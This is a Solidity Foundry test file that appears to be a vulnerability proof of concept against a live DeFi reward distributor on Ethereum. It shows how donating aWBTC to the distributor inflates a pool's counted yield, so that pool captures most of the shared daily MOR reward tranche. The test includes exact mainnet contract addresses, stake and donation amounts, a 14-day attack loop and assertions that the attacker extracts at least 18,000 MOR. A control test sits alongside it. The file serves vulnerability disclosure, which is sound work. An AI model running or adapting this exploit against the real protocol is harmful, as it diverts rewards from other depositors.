// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {stdStorage, StdStorage} from "forge-std/StdStorage.sol";

/// @notice CAP-D1 PoC — donated "yield" hijacks the cross-pool MOR split.
///
/// Mechanism (DistributorV2.distributeRewards, public, 1-day gate): a pool's
/// yield is the RAW balanceOf(yieldToken) delta vs lastUnderlyingBalance, with
/// no reconciliation against deposits / withdrawals / donations. A direct
/// donation of the pool's yield-token (aToken for AAVE pools) therefore counts
/// as yield dollar-for-dollar, and the donating pool takes that share of the
/// single daily MOR tranche (index 0, shared by all 5 public pools).
///
/// Attack (wBTC pool): donate ~$1,000/day of aWBTC + stake 7.4 wBTC
/// (~90% of the pool's virtual) at 1x, no lock, no referrer. Repeat daily for
/// 14 days (the claim lock), then claim.
///
/// Fork-artifact handling (all documented, none of it touches protocol logic):
///  1. `evm_version = "prague"` in foundry.toml — the Aave V3 Pool impl uses
///     Cancun opcodes; the Foundry default spec reverts Pool.supply with
///     `NotActivated` (~59M gas). Verified: shanghai fails, cancun/prague pass.
///  2. Chainlink staleness — on a time-warped fork the feeds stop updating, so
///     after +1 day every feed is stale and updateDepositTokensPrices() would
///     revert (DR: price for pair is zero). On mainnet the feeds update
///     continuously, so distributeRewards works daily. We simulate continued
///     oracle freshness by setting allowedPriceUpdateDelay[feed] = max for the
///     6 feeds in the 5 paths (vm.store on the ChainLinkDataConsumer, slot
///     located empirically with stdstore — the deployed layout differs from
///     the repo source). PRICES ARE NOT CHANGED: they stay at fork-block
///     values; only the freshness window is widened.
///  3. Lido does not rebase on a warped fork, so the stETH pool's on-fork
///     yield is its pre-fork accrual only (day 1), then 0. Aave aToken
///     balances DO grow with warped time (the liquidity index is time-based),
///     so AAVE pools keep accruing on-fork yield — measured: USDC ~$47/day
///     (live estimate ~$41/day) dominates the control's days 2-14 (~97.5% of the tranche). The fork
///     therefore does NOT reproduce mainnet's competing-yield mix (live:
///     stETH ~$496/day, USDT ~$454/day, USDC ~$41/day). Fork MOR figures are
///     reported as fork-measured; mainnet-model figures (~18,000 MOR gross)
///     are derived from live yields and stated separately. NOTE: aUSDT's
///     on-fork accrual measured ~$0.34/day vs ~$454/day live APY — a
///     reserve/index quirk at the fork block, logged in the control; it does
///     not affect the attack measurements (the donation dominates regardless).
///  4. `deal()` cannot fund an aToken (ray-scaled balance). The attacker
///     obtains aWBTC with a REAL Aave supply of 0.22 WBTC (a normal DeFi
///     action), which mints ~0.22 aWBTC.
///  5. The attacker approves the DISTRIBUTOR (not the DepositPool) for WBTC:
///     Distributor.supply() pulls the stake token directly from the staker
///     via transferFrom(holder_, ...).
///
/// No privileged accounts. Attacker funded via deal() + one real Aave supply.
/// Read-only fork testing: no mainnet/testnet transactions.
contract D1DonatedYieldTest is Test {
    using stdStorage for StdStorage;

    // --- fork / protocol addresses (verified on-chain at block 26432489) ---
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant AWBTC = 0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8;
    address constant AUSDC = 0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c;
    address constant AUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    uint256 constant FORK_BLOCK = 26450000;

    // --- attack parameters ---
    uint256 constant STAKE_SAT = 7.4e8; // 7.4 wBTC
    uint256 constant DAILY_DONATION_SAT = 1_556_000; // 0.01556 wBTC ~= $1,000/day
    uint256 constant DAYS = 14;
    uint256 constant DAY_STEP = 86460; // 86400 gate + 60s margin (gate is strict >)
    uint256 constant CLAIM_VALUE = 1 ether;

    address attacker;
    address[5] pools; // 0 stETH, 1 wBTC, 2 wETH, 3 USDC, 4 USDT
    address cldc;
    address rewardPool;
    uint128 lastCalc0;
    uint256 t0;

    function _dist() internal view returns (IDistributorLike) {
        return IDistributorLike(DIST);
    }

    function setUp() public {
        vm.createSelectFork("eth", FORK_BLOCK);
        t0 = block.timestamp;

        // Resolve pool addresses from the Distributor — never trust truncated lists.
        for (uint256 i = 0; i < 5; i++) pools[i] = _dist().depositPoolAddresses(0, i);
        assertEq(pools[1], 0xdE283F8309Fd1AA46c95d299f6B8310716277A42, "wBTC pool mismatch");
        assertEq(pools[0], 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790, "stETH pool mismatch");

        cldc = _dist().chainLinkDataConsumer();
        rewardPool = _dist().rewardPool();
        lastCalc0 = _dist().rewardPoolLastCalculatedTimestamp(0);

        // Attacker funding: 7.62 WBTC + 2 ETH. 0.22 WBTC -> Aave -> aWBTC.
        attacker = makeAddr("attacker");
        vm.deal(attacker, 2 ether);
        deal(WBTC, attacker, 7.62e8);
        address aavePool = IAaveProviderLike(_dist().aavePoolAddressesProvider()).getPool();
        vm.startPrank(attacker);
        IERC20Like(WBTC).approve(aavePool, 0.22e8);
        IAavePoolLike(aavePool).supply(WBTC, 0.22e8, attacker, 0);
        vm.stopPrank();
        assertGe(IERC20Like(AWBTC).balanceOf(attacker), DAYS * DAILY_DONATION_SAT, "aWBTC short");

        // Simulate continued Chainlink freshness (see header note 2).
        _refreshOracleFeeds();

        // Log the protocol parameters the PoC relies on (read live, not assumed).
        (uint128 wdl, uint128 cldS, uint128 cldC, uint256 minStake,) =
            IDepositPoolLike(pools[1]).rewardPoolsProtocolDetails(0);
        emit log_named_uint("wBTC withdrawLockAfterStake", wdl);
        emit log_named_uint("wBTC claimLockAfterStake", cldS);
        emit log_named_uint("wBTC claimLockAfterClaim", cldC);
        emit log_named_uint("wBTC minimalStake sat", minStake);
        emit log_named_uint("wBTC isMigrationOver", IDepositPoolLike(pools[1]).isMigrationOver() ? 1 : 0);
        emit log_named_uint("tranche lastCalc->day14 (MOR)", _trancheMOR(lastCalc0, uint128(t0 + DAYS * DAY_STEP)));
        emit log_named_uint("fork block ts", t0);
        emit log_named_uint("lastCalc0", lastCalc0);
    }

    // ---------- ATTACK ----------

    function test_attack_D1_donatedYieldHijack() public {
        uint256[5] memory before_;
        for (uint256 i = 0; i < 5; i++) before_[i] = _dist().distributedRewards(0, pools[i]);
        uint256 undistBefore = _dist().undistributedRewards();

        // 1. Stake 7.4 wBTC, 1x, no lock, no referrer. Approve the DISTRIBUTOR.
        vm.startPrank(attacker);
        IERC20Like(WBTC).approve(DIST, STAKE_SAT);
        IDepositPoolLike(pools[1]).stake(0, STAKE_SAT, 0, address(0));
        vm.stopPrank();
        (,,,,,, uint256 virtAttacker,,) = IDepositPoolLike(pools[1]).usersData(attacker, 0);
        (,, uint256 totalVirt) = IDepositPoolLike(pools[1]).rewardPoolsData(0);
        emit log_named_uint("attacker virtual sat", virtAttacker);
        emit log_named_uint("pool totalVirtual sat", totalVirt);
        uint256 attackerShareBps = (virtAttacker * 10000) / totalVirt;
        emit log_named_uint("attacker virtual share bps", attackerShareBps);
        assertGe(attackerShareBps, 8500, "attacker virtual share < 85%");

        // 2. 14x: warp a day, donate $1k aWBTC to the Distributor, distribute.
        uint256 totalDonated;
        for (uint256 day = 1; day <= DAYS; day++) {
            vm.warp(block.timestamp + DAY_STEP);
            vm.prank(attacker);
            bool ok = IERC20Like(AWBTC).transfer(DIST, DAILY_DONATION_SAT);
            assertTrue(ok, "donation transfer failed");
            totalDonated += DAILY_DONATION_SAT;

            uint256 wBefore = _dist().distributedRewards(0, pools[1]);
            uint256 sBefore = _dist().distributedRewards(0, pools[0]);
            _dist().distributeRewards(0);
            emit log_named_uint("day wBTC delta MOR", (_dist().distributedRewards(0, pools[1]) - wBefore) / 1e18);
            emit log_named_uint("day stETH delta MOR", (_dist().distributedRewards(0, pools[0]) - sBefore) / 1e18);
            emit log_named_uint("day undistributed MOR", _dist().undistributedRewards() / 1e18);
        }
        emit log_named_uint("total donated aWBTC sat", totalDonated);

        uint256[5] memory delta;
        uint256 sumDelta;
        for (uint256 i = 0; i < 5; i++) {
            delta[i] = _dist().distributedRewards(0, pools[i]) - before_[i];
            sumDelta += delta[i];
        }
        uint256 tranche = _trancheMOR(lastCalc0, uint128(block.timestamp));
        emit log_named_uint("TOTAL tranche MOR", tranche);
        emit log_named_uint("TOTAL stETH delta MOR", delta[0] / 1e18);
        emit log_named_uint("TOTAL wBTC delta MOR", delta[1] / 1e18);
        emit log_named_uint("TOTAL wETH delta MOR", delta[2] / 1e18);
        emit log_named_uint("TOTAL USDC delta MOR", delta[3] / 1e18);
        emit log_named_uint("TOTAL USDT delta MOR", delta[4] / 1e18);
        emit log_named_uint("TOTAL sum pools delta MOR", sumDelta / 1e18);
        emit log_named_uint("TOTAL wBTC share of tranche bps", (delta[1] * 10000) / (tranche * 1e18));
        emit log_named_uint("TOTAL undistributed delta MOR", (_dist().undistributedRewards() - undistBefore) / 1e18);

        // A1: wBTC pool takes >= 40% of the 14-day tranche (model: ~50% mainnet, ~92% fork).
        assertGe(delta[1], (tranche * 1e18 * 40) / 100, "A1 FAIL: wBTC pool share < 40% of tranche");
        // A4: the biggest mainnet pool (stETH) is crushed to < 10% of the tranche.
        assertLe(delta[0], (tranche * 1e18 * 10) / 100, "A4 FAIL: stETH share not crushed");

        // 3. Claim after the 14-day claim lock. Capture pending first.
        uint256 pendingBefore = IDepositPoolLike(pools[1]).getLatestUserReward(0, attacker);
        emit log_named_uint("attacker pending MOR before claim", pendingBefore / 1e18);
        assertGt(block.timestamp, t0 + 1_209_600, "claim lock not elapsed");

        bool claimed;
        vm.startPrank(attacker);
        try IDepositPoolLike(pools[1]).claim{value: CLAIM_VALUE}(0, attacker) {
            claimed = true;
        } catch {
            claimed = false;
        }
        vm.stopPrank();
        emit log_named_uint("claim via LayerZero succeeded", claimed ? 1 : 0);

        uint256 claimedMOR;
        if (claimed) {
            uint256 pendingAfter = IDepositPoolLike(pools[1]).getLatestUserReward(0, attacker);
            emit log_named_uint("attacker pending MOR after claim", pendingAfter / 1e18);
            assertEq(pendingAfter, 0, "pending not zeroed after claim");
            claimedMOR = pendingBefore;
        } else {
            // Delivery path failed on fork: pending rewards are the measurement.
            claimedMOR = pendingBefore;
            emit log_string("NOTE: claim() reverted on fork (LayerZero send) - see results note");
        }
        emit log_named_uint("attacker claimed/pending MOR", claimedMOR / 1e18);

        // A2: attacker extracts a large MOR amount (model ~18,000 mainnet; fork ~35,000).
        assertGe(claimedMOR, 18_000e18, "A2 FAIL: attacker MOR < 18,000");
    }

    // ---------- CONTROL (no donation, no attacker stake) ----------

    function test_control_noAttack() public {
        uint256[5] memory before_;
        for (uint256 i = 0; i < 5; i++) before_[i] = _dist().distributedRewards(0, pools[i]);
        uint256 undistBefore = _dist().undistributedRewards();
        uint256 aUsdcBal0 = IERC20Like(AUSDC).balanceOf(DIST);
        uint256 aUsdtBal0 = IERC20Like(AUSDT).balanceOf(DIST);

        for (uint256 day = 1; day <= DAYS; day++) {
            vm.warp(block.timestamp + DAY_STEP);
            uint256 wBefore = _dist().distributedRewards(0, pools[1]);
            uint256 sBefore = _dist().distributedRewards(0, pools[0]);
            _dist().distributeRewards(0);
            emit log_named_uint("control day wBTC delta MOR", (_dist().distributedRewards(0, pools[1]) - wBefore) / 1e18);
            emit log_named_uint("control day stETH delta MOR", (_dist().distributedRewards(0, pools[0]) - sBefore) / 1e18);
            emit log_named_uint("control day undistributed MOR", _dist().undistributedRewards() / 1e18);
        }

        uint256[5] memory delta;
        uint256 sumDelta;
        for (uint256 i = 0; i < 5; i++) {
            delta[i] = _dist().distributedRewards(0, pools[i]) - before_[i];
            sumDelta += delta[i];
        }
        uint256 tranche = _trancheMOR(lastCalc0, uint128(block.timestamp));
        emit log_named_uint("CONTROL total tranche MOR", tranche);
        emit log_named_uint("CONTROL stETH delta MOR", delta[0] / 1e18);
        emit log_named_uint("CONTROL wBTC delta MOR", delta[1] / 1e18);
        emit log_named_uint("CONTROL wETH delta MOR", delta[2] / 1e18);
        emit log_named_uint("CONTROL USDC delta MOR", delta[3] / 1e18);
        emit log_named_uint("CONTROL USDT delta MOR", delta[4] / 1e18);
        emit log_named_uint("CONTROL sum pools delta MOR", sumDelta / 1e18);
        emit log_named_uint("CONTROL undistributed delta MOR", (_dist().undistributedRewards() - undistBefore) / 1e18);
        // aToken balance growth over the 14 warped days (time-based index accrual).
        emit log_named_uint("CONTROL aUSDC bal growth (6dec)", IERC20Like(AUSDC).balanceOf(DIST) - aUsdcBal0);
        emit log_named_uint("CONTROL aUSDT bal growth (6dec)", IERC20Like(AUSDT).balanceOf(DIST) - aUsdtBal0);

        // C1: without any donation, the wBTC pool earns ~nothing (baseline ~0.01%).
        assertLe(delta[1], 100e18, "C1 FAIL: control wBTC delta not ~0");
        // C2: the tranche is (nearly) fully distributed in the control too — the
        // donation REDISTRIBUTES it, it does not activate it. (An earlier draft
        // assumed on-fork yields go to ~0 after day 1 and the tranche would go
        // undistributed; measured: USDC's aToken balance grows with warped time,
        // so USDC takes ~97% of days 2-14. See results note.)
        assertGe(sumDelta, (tranche * 1e18 * 95) / 100, "C2 FAIL: control did not distribute ~full tranche");
        // C3: stETH earns real day-1 yield in the control — the counterfactual
        // baseline for the victim-loss comparison (attack: 1,299 vs control: ~4,003).
        assertGt(delta[0], 1000e18, "C3 FAIL: control stETH delta too small");
    }

    // ---------- helpers ----------

    function _trancheMOR(uint128 from, uint128 to) internal view returns (uint256) {
        return IRewardPoolLike(rewardPool).getPeriodRewards(0, from, to) / 1e18;
    }

    function _refreshOracleFeeds() internal {
        string[5] memory paths = ["stETH/USD", "wBTC/BTC,BTC/USD", "wETH/USD", "USDC/USD", "USDT/USD"];
        for (uint256 p = 0; p < 5; p++) {
            bytes32 pid = IChainLinkLike(cldc).getPathId(paths[p]);
            for (uint256 f = 0; ; f++) {
                address feed;
                try IChainLinkLike(cldc).dataFeeds(pid, f) returns (address fd) {
                    feed = fd;
                } catch {
                    break;
                }
                if (feed == address(0)) break;
                uint256 slot = stdstore.target(cldc).sig("allowedPriceUpdateDelay(address)").with_key(feed).find();
                vm.store(cldc, bytes32(slot), bytes32(uint256(type(uint64).max)));
                assertEq(IChainLinkLike(cldc).allowedPriceUpdateDelay(feed), type(uint64).max, "oracle slot wrong");
            }
            // Prices must still read (frozen at fork values).
            assertGt(IChainLinkLike(cldc).getChainLinkDataFeedLatestAnswer(pid), 0, "price zero after refresh");
        }
    }
}

// ---------- minimal interfaces ----------

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IDistributorLike {
    function depositPoolAddresses(uint256, uint256) external view returns (address);
    function distributedRewards(uint256, address) external view returns (uint256);
    function undistributedRewards() external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function chainLinkDataConsumer() external view returns (address);
    function rewardPool() external view returns (address);
    function aavePoolAddressesProvider() external view returns (address);
    function distributeRewards(uint256) external;
}

interface IDepositPoolLike {
    function stake(uint256, uint256, uint128, address) external;
    function claim(uint256, address) external payable;
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function isMigrationOver() external view returns (bool);
    function rewardPoolsData(uint256) external view returns (uint128, uint256, uint256);
    function rewardPoolsProtocolDetails(uint256)
        external
        view
        returns (uint128, uint128, uint128, uint256, uint256);
    function usersData(address, uint256)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
}

interface IRewardPoolLike {
    function getPeriodRewards(uint256, uint128, uint128) external view returns (uint256);
}

interface IChainLinkLike {
    function dataFeeds(bytes32, uint256) external view returns (address);
    function allowedPriceUpdateDelay(address) external view returns (uint64);
    function getChainLinkDataFeedLatestAnswer(bytes32) external view returns (uint256);
    function getPathId(string memory) external pure returns (bytes32);
}

interface IAaveProviderLike {
    function getPool() external view returns (address);
}

interface IAavePoolLike {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}
